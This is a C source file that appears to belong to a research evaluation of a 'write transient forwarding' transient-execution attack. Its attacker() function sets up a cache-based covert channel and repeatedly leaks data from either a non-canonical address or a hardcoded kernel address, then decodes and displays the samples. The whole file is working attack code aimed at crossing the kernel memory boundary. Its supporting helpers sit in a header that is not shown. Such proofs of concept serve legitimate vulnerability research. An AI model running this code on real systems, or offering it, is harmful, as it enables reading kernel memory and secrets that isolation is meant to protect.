// evaluate the write transient forwarding attack

#include "common.h"

#include <cpuid.h>
#include <stdint.h>
#include <string.h>
#include <sys/user.h>
#include <unistd.h>

// possible settings:
// TARGET_NONCANON, TARGET_KERNEL: access a non-canonical address or a kernel address during the attack

#if defined(TARGET_NONCANON) == defined(TARGET_KERNEL)
#error "Invalid target definition"
#endif

// hardcoded base address of the main kernel image
#define KERNEL_BASE 0xffffffff80000000

void attacker(void) {
    // prepare cache-based transmission channel
    transmit_t transmit;
    transmit_prepare(&transmit);

    for (size_t i = 0; i < SAMPLE_COUNT; i++) {
        for (size_t j = 0; j < COUNTS_PER_SAMPLE; j++) {

#if defined(TARGET_NONCANON)
            // access non-canonical address
            void *target = (void *)0x4141414141410000ul;
#elif defined(TARGET_KERNEL)
            // access kernel address
            void *target = (void *)(KERNEL_BASE + 0x1000000);
#endif

            transmit_leak_start(&transmit);
            leak_and_transmit(&transmit, target);
            transmit_leak_end(&transmit);

            transmit_receive(&transmit);
        }
        transmit_decode(&transmit);
    }

    transmit_display(&transmit);
}
